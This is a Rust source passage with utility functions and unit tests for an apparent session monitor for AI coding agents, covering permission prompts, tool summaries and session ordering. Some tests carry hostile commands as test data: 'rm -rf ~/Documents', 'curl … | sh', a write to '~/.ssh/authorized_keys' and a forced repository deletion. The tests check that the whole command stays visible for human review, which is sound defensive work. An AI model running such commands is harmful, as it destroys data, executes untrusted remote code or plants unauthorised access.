    (float.fract() == 0.0 && float.abs() < 9.0e18).then_some(float as i64)
}

/// Compact JSON with every object's keys sorted, as `JSONSerialization`
/// writes with `.sortedKeys`, whatever order `serde_json` keeps maps in.
pub fn canonical_json(value: &Value) -> String {
    let mut out = String::new();
    write_canonical(value, &mut out);
    out
}

fn write_canonical(value: &Value, out: &mut String) {
    match value {
        Value::Object(map) => {
            let mut keys: Vec<&String> = map.keys().collect();
            keys.sort();
            out.push('{');
            for (index, key) in keys.iter().enumerate() {
                if index > 0 {
                    out.push(',');
                }
                out.push_str(&Value::String((*key).clone()).to_string());
                out.push(':');
                write_canonical(&map[key.as_str()], out);
            }
            out.push('}');
        }
        Value::Array(items) => {
            out.push('[');
            for (index, item) in items.iter().enumerate() {
                if index > 0 {
                    out.push(',');
                }
                write_canonical(item, out);
            }
            out.push(']');
        }
        other => out.push_str(&other.to_string()),
    }
}

/// Characters as Swift counts them: grapheme clusters.
pub(crate) fn char_count(text: &str) -> usize {
    text.graphemes(true).count()
}

/// The first `count` characters, as Swift's `prefix`.
pub(crate) fn prefix(text: &str, count: usize) -> &str {
    match text.grapheme_indices(true).nth(count) {
        Some((end, _)) => &text[..end],
        None => text,
    }
}

/// The text cut to `limit` characters, the last one an ellipsis.
pub(crate) fn clip_to(text: &str, limit: usize) -> String {
    if char_count(text) > limit {
        format!("{}…", prefix(text, limit.saturating_sub(1)))
    } else {
        text.to_owned()
    }
}

/// Trimmed text cut to `limit` characters, or nil when nothing is left.
pub(crate) fn preview(text: Option<&str>, limit: usize) -> Option<String> {
    let trimmed = trim(text?);
    (!trimmed.is_empty()).then(|| clip_to(trimmed, limit))
}

/// Foundation's `whitespacesAndNewlines` trim, which also takes the zero-width
/// space that `str::trim` keeps. (`whitespaces` alone, used for a summary's
/// one line, differs only by line breaks, which that line has none of.)
pub(crate) fn trim(text: &str) -> &str {
    text.trim_matches(|c: char| c.is_whitespace() || c == '\u{200B}')
}

/// Swift's `Character.isNewline`.
fn is_newline(c: char) -> bool {
    matches!(
        c,
        '\n' | '\r' | '\u{0B}' | '\u{0C}' | '\u{85}' | '\u{2028}' | '\u{2029}'
    )
}

const SEPARATORS: [char; 2] = ['/', '\\'];

/// `NSString.lastPathComponent`, for Windows paths too: either slash
/// separates, and trailing ones are ignored.
pub fn last_path_component(path: &str) -> String {
    let trimmed = path.trim_end_matches(SEPARATORS);
    if trimmed.is_empty() {
        return path.chars().next().map(String::from).unwrap_or_default();
    }
    trimmed
        .rsplit(SEPARATORS)
        .next()
        .unwrap_or(trimmed)
        .to_owned()
}

/// The folder an agent ran in names the project. A worktree kept inside
/// the repository still belongs to that repository.
pub fn project_name(path: &str) -> String {
    let mut path = path;
    for marker in ["/.claude/worktrees/", "\\.claude\\worktrees\\"] {
        if let Some(index) = path.find(marker) {
            path = &path[..index];
        }
    }
    let mut path = path.to_owned();
    while path.chars().count() > 1 && path.ends_with(SEPARATORS) {
        path.pop();
    }
    last_path_component(&path)
}

/// The host of an address, as `URL(string:)?.host` gives it: nil for text
/// that is no URL or has no host.
fn url_host(text: &str) -> Option<String> {
    if text.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return None;
    }
    let (scheme, rest) = text.split_once("://")?;
    let mut letters = scheme.chars();
    if !letters.next()?.is_ascii_alphabetic()
        || !letters.all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
    {
        return None;
    }
    let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
    let host_port = authority
        .rsplit_once('@')
        .map_or(authority, |(_, host)| host);
    let host = match host_port.strip_prefix('[') {
        Some(bracketed) => bracketed.split(']').next().unwrap_or(""),
        None => host_port.split(':').next().unwrap_or(""),
    };
    (!host.is_empty()).then(|| host.to_owned())
}

/// Days since 1970 from a civil date, valid for every Gregorian year.
pub(crate) fn days_from_civil(year: i64, month: i64, day: i64) -> i64 {
    let y = if month <= 2 { year - 1 } else { year };
    let era = if y >= 0 { y } else { y - 399 } / 400;
    let yoe = y - era * 400;
    let doy = (153 * (month + if month > 2 { -3 } else { 9 }) + 2) / 5 + day - 1;
    let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    era * 146_097 + doe - 719_468
}

#[cfg(test)]
mod tests {
    // Skipped from ClaudeSessionEngineTests.swift `support`: names, project
    // colors, renames, auto-expand, the strip, thinking words, markdown,
    // text sizes, geometry and strings. They are the UI's, not this module's.
    use super::background_kind::is_service;
    use super::tool_summary::*;
    use super::*;
    use serde_json::json;

    fn obj(value: Value) -> Map<String, Value> {
        value.as_object().cloned().unwrap()
    }

    fn session(id: &str, phase: SessionPhase, since: f64, project: &str) -> Session {
        Session {
            provider: Provider::Claude,
            id: id.into(),
            pid: id.len() as i32,
            cwd: format!("/x/{project}"),
            project: project.into(),
            name: project.into(),
            name_source: None,
            branch: None,
            model: None,
            model_name: None,
            host: HostKind::WindowsTerminal,
            accepts_replies: true,
            phase,
            phase_since: since,
            turn_started: Some(since),
            last_active: None,
            looked_at: None,
            waiting_for: None,
            current_tool: None,
            permission: None,
            timeline: vec![],
            subagents: vec![],
            tasks: None,
            tokens: Tokens::default(),
            cost: 0.0,
            title: None,
            last_text: None,
            hooked: false,
            chat: vec![],
            background_label: None,
            services: 0,
            background: None,
            limit_stop: None,
        }
    }

    // ClaudeSessionEngineTests.swift: the background kinds.
    #[test]
    fn background_kinds() {
        let kinds = [
            (
                "Run own local Convex backend",
                "cd app && CONVEX_AGENT_MODE=anonymous npx convex dev",
                true,
            ),
            (
                "Run own Metro on port 8088",
                "npx expo start --dev-client --port 8088",
                true,
            ),
            (
                "Serve upload files locally with CORS",
                "python3 serve.py",
                true,
            ),
            ("Boot the iOS simulator", "xcrun simctl boot lutra", true),
            (
                "Build fresh Android dev client from worktree",
                "cd app && ./gradlew assembleDebug",
                false,
            ),
            (
                "Render final PL and EN header videos and check them",
                "node render.mjs --out film.mp4",
                false,
            ),
            (
                "Wait 10 minutes for Apple video processing",
                "sleep 600; echo wake",
                false,
            ),
            ("Run the test suite", "npm test", false),
        ];
        for (description, command, service) in kinds {
            assert_eq!(
                is_service(command, Some(description)),
                service,
                "{description}"
            );
        }
    }

    // The lookahead the `regex` crate lacks, matched by hand.
    #[test]
    fn docker_compose_up() {
        assert!(
            is_service("docker compose up", None),
            "attached up is a service"
        );
        assert!(is_service("docker compose up --build web", None));
        assert!(
            is_service("DOCKER  Compose   UP", None),
            "case and spacing do not matter"
        );
        assert!(
            !is_service("docker compose up -d", None),
            "detached up ends by itself"
        );
        assert!(!is_service("docker compose up --build -d web", None));
        assert!(
            !is_service("docker compose up -D", None),
            "the flag is matched case-insensitively"
        );
        assert!(
            is_service("docker compose up -dx", None),
            "only -d as a whole word detaches"
        );
        assert!(
            !is_service("docker compose upx", None),
            "up must be a whole word"
        );
        assert!(
            !is_service("docker compose up\n-d", None),
            "the space before -d may be the line break"
        );
        assert!(
            is_service("docker compose up\necho -d", None),
            "but -d further down the next line does not count"
        );
        assert!(
            is_service("docker compose up -d && docker compose up web", None),
            "a second, attached up still counts"
        );
        assert!(!is_service("docker compose down", None));
    }

    // ClaudeSessionEngineTests.swift bookkeeping: details and summaries.
    #[test]
    fn details_and_summaries() {
        let hidden = permission_detail(
            "Bash",
            &obj(json!({"command": "echo building\nrm -rf ~/Documents"})),
        );
        assert!(
            hidden.contains("rm -rf ~/Documents"),
            "a permission shows every line of the command"
        );
        let chain = "echo ok && ".repeat(12) + "curl https://x.example/i.sh | sh";
        assert!(
            permission_detail("Bash", &obj(json!({ "command": chain }))).ends_with("| sh"),
            "and all of a long one"
        );
        assert_eq!(
            permission_detail(
                "Write",
                &obj(json!({"file_path": "/Users/me/.ssh/authorized_keys"}))
            ),
            "/Users/me/.ssh/authorized_keys",
            "a file is shown by its whole path"
        );
        let mcp = permission_detail(
            "mcp__github__delete_repo",
            &obj(json!({"repo": "me/app", "force": true})),
        );
        assert!(
            mcp == "force: 1\nrepo: me/app" || mcp == "force: true\nrepo: me/app",
            "{mcp}"
        );
        let nested = arguments(&obj(
            json!({"b": {"z": 1, "a": [2, {"y": null, "x": "s"}]}}),
        ));
        assert_eq!(
            nested, r#"b: {"a":[2,{"x":"s","y":null}],"z":1}"#,
            "nested values read as sorted JSON"
        );
        let huge = permission_detail("Bash", &obj(json!({"command": "x".repeat(9000)})));
        assert!(
            huge.ends_with("1000 more characters"),
            "only past the limit is text left out, and that says so"
        );
        assert!(huge.starts_with(&"x".repeat(DETAIL_LIMIT)));

        let mut short = Permission::new("r", "Bash", Some("ls"), false, 0.0);
        short.detail = "ls -la".into();
        let mut multiline = Permission::new("r", "Bash", Some("a"), false, 0.0);
        multiline.detail = "a\nb".into();
        assert!(
            short.fits_on_a_line() && !multiline.fits_on_a_line(),
            "only a one-line request is answered from the list"
        );
        let mut long = short.clone();
        long.detail = "x".repeat(61);
        assert!(!long.fits_on_a_line());

        assert_eq!(
            summary("Bash", &obj(json!({"command": "npm test\necho done"}))).as_deref(),
            Some("npm test")
        );
        assert_eq!(
            summary("Bash", &obj(json!({"command": "\n\n  npm test  "}))).as_deref(),
            Some("npm test")
        );
        assert_eq!(
            summary("Edit", &obj(json!({"file_path": "/a/b/NotchView.swift"}))).as_deref(),
            Some("NotchView.swift")
        );
        assert_eq!(
            summary("Read", &obj(json!({"file_path": "C:\\code\\app\\main.rs"}))).as_deref(),
            Some("main.rs")
        );
        assert_eq!(
            summary("NotebookEdit", &obj(json!({"notebook_path": "/n/a.ipynb"}))).as_deref(),
            Some("a.ipynb")
        );
        assert_eq!(
            summary(
                "WebFetch",
                &obj(json!({"url": "https://docs.example.com/x"}))
            )
            .as_deref(),
            Some("docs.example.com"),
            "a fetch reads as its host"
        );
        assert_eq!(
            summary("WebFetch", &obj(json!({"url": "not a url"}))).as_deref(),
            Some("not a url")
        );
        assert_eq!(
            summary("Grep", &obj(json!({"pattern": "fn main"}))).as_deref(),
            Some("fn main")
        );
        assert_eq!(
            summary("Skill", &obj(json!({"skill": "pdf"}))).as_deref(),
            Some("pdf")
        );
        assert_eq!(
            summary("mcp__x", &obj(json!({"description": "Do it"}))).as_deref(),
            Some("Do it")
        );
        assert_eq!(
            summary("Bash", &obj(json!({"command": "   "}))),
            None,
            "blank input reads as nothing"
        );
        let long = summary("Bash", &obj(json!({"command": "x".repeat(200)}))).unwrap_or_default();
        assert!(
            char_count(&long) == LIMIT && long.ends_with('…'),
            "long input is clipped"
        );

        let a = input_key("WebFetch", &obj(json!({"url": "https://a.example"})));
        assert_eq!(
            a,
            input_key("WebFetch", &obj(json!({"url": "https://a.example"})))
        );
        assert_ne!(
            a,
            input_key("WebFetch", &obj(json!({"url": "https://b.example"})))
        );
    }

    #[test]
    fn url_hosts() {
        assert_eq!(
            url_host("https://user:pw@Example.com:8080/a?b#c").as_deref(),
            Some("Example.com")
        );
        assert_eq!(url_host("http://[::1]:80/").as_deref(), Some("::1"));
        assert_eq!(url_host("file:///etc/hosts"), None);
        assert_eq!(url_host("mailto:a@b.c"), None);
        assert_eq!(url_host("https://a b.com"), None);
    }

    #[test]
    fn paths_and_projects() {
        assert_eq!(last_path_component("/Users/me/"), "me");
        assert_eq!(last_path_component("/"), "/");
        assert_eq!(last_path_component(""), "");
        assert_eq!(project_name("/Users/me/code/app"), "app");
        assert_eq!(
            project_name("/Users/me/code/app/.claude/worktrees/feat-x"),
            "app"
        );
        assert_eq!(project_name("C:\\Users\\me\\code\\app\\"), "app");
        assert_eq!(project_name("C:\\code\\app\\.claude\\worktrees\\w1"), "app");
    }

    #[test]
    fn questions() {
        let input = obj(json!({"questions": [
            {"question": "Which color?", "header": "Color", "options": [
                {"label": "Red", "description": "Warm"}, {"label": "Blue", "description": "", "preview": "[ blue ]"}, {"label": ""}],
             "multiSelect": false},
            {"question": "Which sizes?", "header": "", "options": [{"label": "S"}, {"label": "M"}], "multiSelect": true}]}));
        let parsed = Question::questions_in(&input).unwrap();
        assert_eq!(parsed.len(), 2);
        assert_eq!(parsed[0].header.as_deref(), Some("Color"));
        assert_eq!(parsed[1].header, None);
        assert_eq!(
            parsed[0].options,
            vec![
                QuestionOption {
                    label: "Red".into(),
                    description: Some("Warm".into()),
                    preview: None
                },
                QuestionOption {
                    label: "Blue".into(),
                    description: None,
                    preview: Some("[ blue ]".into())
                },
            ]
        );
        assert!(parsed[1].multi_select && !parsed[0].multi_select);
        for broken in [
            json!({"questions": [{"header": "x"}]}),
            json!({"questions": []}),
            json!({"questions": [{"question": "  "}]}),
            json!({"questions": [{"question": "A"}, {"header": "no question"}]}),
            json!({"questions": [{"question": "A"}, 3]}),
            json!({"questions": "A"}),
            json!({}),
        ] {
            assert_eq!(
                Question::questions_in(&obj(broken.clone())),
                None,
                "{broken}"
            );
        }
        // Options that are not all objects read as none, as `as? [[String: Any]]`.
        let loose = Question::questions_in(&obj(
            json!({"questions": [{"question": "A", "options": [{"label": "x"}, 1]}]}),
        ));
        assert_eq!(loose.unwrap()[0].options, vec![]);
    }

    // ClaudeSessionEngineTests.swift support: the order of the list.
    #[test]
    fn order() {
        let order: Vec<String> = sorted(vec![
            session("a", SessionPhase::Idle, 0.0, "zeta"),
            session("b", SessionPhase::Finished, 5.0, "b"),
            session("c", SessionPhase::Generating, 9.0, "c"),
            session("d", SessionPhase::WaitingPermission, 7.0, "d"),
            session("e", SessionPhase::Finished, 8.0, "e"),
            session("f", SessionPhase::RunningTool, 3.0, "f"),
            session("g", SessionPhase::Idle, 0.0, "alpha"),
            session("h", SessionPhase::WaitingInput, 1.0, "h"),
        ])
        .into_iter()
        .map(|s| s.id)
        .collect();
        assert_eq!(order, ["d", "h", "f", "c", "e", "b", "g", "a"]);
        let mut old = session("old", SessionPhase::Idle, 0.0, "alpha");
        let mut fresh = session("fresh", SessionPhase::Idle, 0.0, "zeta");
        old.last_active = Some(10.0);
        fresh.last_active = Some(500.0);
        let rendering = session("bg", SessionPhase::Background, 2.0, "m");
        let quiet: Vec<String> = sorted(vec![old, fresh, rendering])
            .into_iter()
            .map(|s| s.id)
            .collect();
        assert_eq!(quiet, ["bg", "fresh", "old"]);

        let mut waits = vec![
            session("late", SessionPhase::WaitingPermission, 9.0, "a"),
            session("early", SessionPhase::WaitingPermission, 2.0, "z"),
        ];
        waits = sorted(waits);
        assert_eq!(waits[0].id, "early", "the one waiting longest leads");
        let mut x = session("x", SessionPhase::Idle, 0.0, "same");
        x.pid = 9;
        let mut y = session("y", SessionPhase::Idle, 0.0, "same");
        y.pid = 3;
        assert_eq!(sorted(vec![x, y])[0].id, "y", "ties go by pid");
    }

    #[test]
    fn standard_order() {
        assert_eq!(
            standard_compare("app2", "app10"),
            Ordering::Less,
            "numbers compare as numbers"
        );
        assert_eq!(
            standard_compare("Alpha", "beta"),
            Ordering::Less,
            "case does not matter"
        );
        assert_eq!(standard_compare("app", "app-x"), Ordering::Less);
        assert_ne!(
            standard_compare("A", "a"),
            Ordering::Equal,
            "but the order stays total"
        );
    }

    // ClaudeSessionEngineTests.swift support: counts.
    #[test]
    fn counts() {
        let mut codex = session("f", SessionPhase::Generating, 0.0, "f");
        codex.provider = Provider::Codex;
        let mut codex_waiting = session("g", SessionPhase::WaitingPermission, 0.0, "g");
        codex_waiting.provider = Provider::Codex;
        let counts = SessionCounts::of(&[
            session("a", SessionPhase::WaitingInput, 0.0, "a"),
            session("b", SessionPhase::RunningTool, 0.0, "b"),
            session("c", SessionPhase::Finished, 0.0, "c"),
            session("d", SessionPhase::Background, 0.0, "d"),
            session("e", SessionPhase::Idle, 0.0, "e"),
            codex,
            codex_waiting,
        ]);
        assert_eq!(
            counts,
            SessionCounts {
                working: 3,
                working_codex: 1,
                waiting: 2,
                limited: 0,
                finished: 1
            }
        );
        assert!(SessionCounts::default().is_empty() && !counts.is_empty());
        assert!(SessionPhase::Background.is_active() && !SessionPhase::Background.is_working());
    }

    #[test]
    fn doze() {
        let mut quiet = session("a", SessionPhase::Idle, 0.0, "a");
        assert!(
            !dozes(&quiet, DOZE_AFTER - 1.0) && dozes(&quiet, DOZE_AFTER),
            "idle long enough dozes"
        );
        quiet.last_active = Some(100.0);
        assert!(
            !dozes(&quiet, DOZE_AFTER + 50.0),
            "counted from the last activity"
        );
        quiet.looked_at = Some(1000.0);
        assert!(
            !dozes(&quiet, 1000.0 + DOZE_AFTER - 1.0) && dozes(&quiet, 1000.0 + DOZE_AFTER),
            "or from a look"
        );
        let working = session("b", SessionPhase::Finished, 0.0, "b");
        assert!(!dozes(&working, 1e9), "only an idle session dozes");
    }

    // ClaudeSessionEngineTests.swift support: canReply.
    #[test]
    fn replies() {
        assert!(
            can_reply(&session("a", SessionPhase::Finished, 0.0, "a")),
            "a reply goes to a reachable terminal"
        );
        assert!(
            !can_reply(&session("a", SessionPhase::WaitingPermission, 0.0, "a")),
            "never while it waits on a dialog"
        );
        let mut other = session("a", SessionPhase::Idle, 0.0, "a");
        other.accepts_replies = false;
        assert!(
            !can_reply(&other),
            "nor to a terminal the island cannot type into"
        );
        let mut dialog = session("a", SessionPhase::Idle, 0.0, "a");
        dialog.waiting_for = Some("dialog open".into());
        assert!(!can_reply(&dialog), "nor into an open dialog");
    }

    #[test]
    fn json_shape() {
        let mut ask = Permission::new("r1", "Bash", Some("ls"), true, 5.0);
        ask.detail = "ls".into();
        ask.tool_id = Some("t1".into());
        let mut shown = session("s1", SessionPhase::WaitingPermission, 1.0, "app");
        shown.permission = Some(ask);
        shown.current_tool = Some(ToolUse::new("t1", "Bash", None, 1.0));
        let value = serde_json::to_value(&shown).unwrap();
        assert_eq!(value["phase"], "waitingPermission");
        assert_eq!(value["host"], "windowsTerminal");
        assert_eq!(value["acceptsReplies"], true);
        assert_eq!(value["permission"]["requestId"], "r1");
        assert_eq!(value["permission"]["fitsOnALine"], true);
        assert_eq!(value["permission"]["asksQuestions"], false);
        assert!(
            value["permission"].get("toolId").is_none()
                && value["permission"].get("inputKey").is_none()
        );
        assert!(
            value.get("title").is_none(),
            "absent text is left out, not null"
        );
        assert!(
            value["currentTool"].get("summary").is_none()
                && value["currentTool"].get("finished").is_none()
        );
        assert_eq!(value["tokens"]["cacheWrite"], 0);
        let event = serde_json::to_value(SessionEvent::NeedsPermission {
            id: "s1".into(),
            tool: "Bash".into(),
        })
        .unwrap();
        assert_eq!(
            event,
            json!({"kind": "needsPermission", "id": "s1", "tool": "Bash"})
        );
        let done = serde_json::to_value(SessionEvent::Finished {
            id: "s1".into(),
            duration: None,
        })
        .unwrap();
        assert_eq!(done, json!({"kind": "finished", "id": "s1"}));
        let agent = serde_json::to_value(Subagent::new("a1", "Explore", 3.0)).unwrap();
        assert_eq!(
            agent,
            json!({"id": "a1", "type": "Explore", "started": 3.0})
        );
        let message = ChatMessage {
            id: 1,
            role: ChatRole::User,
            text: "hi".into(),
            images: Vec::new(),
            at: 2.0,
            ends_turn: false,
        };
        assert_eq!(
            serde_json::to_value(message).unwrap(),
            json!({"id": 1, "role": "user", "text": "hi", "at": 2.0, "endsTurn": false})
        );
    }

    #[test]
    fn text_helpers() {
        assert_eq!(clip_to("abcdef", 4), "abc…");
        assert_eq!(clip_to("abcd", 4), "abcd");
        // A family emoji is one character, as Swift counts.
        let family = "👨‍👩‍👧";
        assert_eq!(char_count(&family.repeat(3)), 3);
        assert_eq!(
            clip_to(&family.repeat(5), 3),
            format!("{}…", family.repeat(2))
        );
        assert_eq!(preview(Some("  \n "), 10), None);
        assert_eq!(preview(Some(" hi "), 10).as_deref(), Some("hi"));
        assert_eq!(days_from_civil(1970, 1, 1), 0);
        assert_eq!(days_from_civil(2000, 3, 1), 11_017);
        assert_eq!(int_of(Some(&json!(7.0))), Some(7));
        assert_eq!(int_of(Some(&json!(7.5))), None);
    }

    #[test]
    fn nan_never_breaks_the_sort() {
        let mut list = Vec::new();
        for n in 0..50 {
            let mut s = session(&format!("s{n}"), SessionPhase::Idle, n as f64, "p");
            s.last_active = if n % 3 == 0 {
                Some(f64::NAN)
            } else {
                Some(n as f64)
            };
            list.push(s);
        }
        assert_eq!(sorted(list).len(), 50);
    }

    #[test]
    fn crlf_is_a_line_break() {
        let mut ask = Permission::new("r", "Bash", None, false, 0.0);
        ask.detail = "echo a\r\necho b".into();
        assert!(
            !ask.fits_on_a_line(),
            "a Windows line break makes two lines"
        );
    }
}
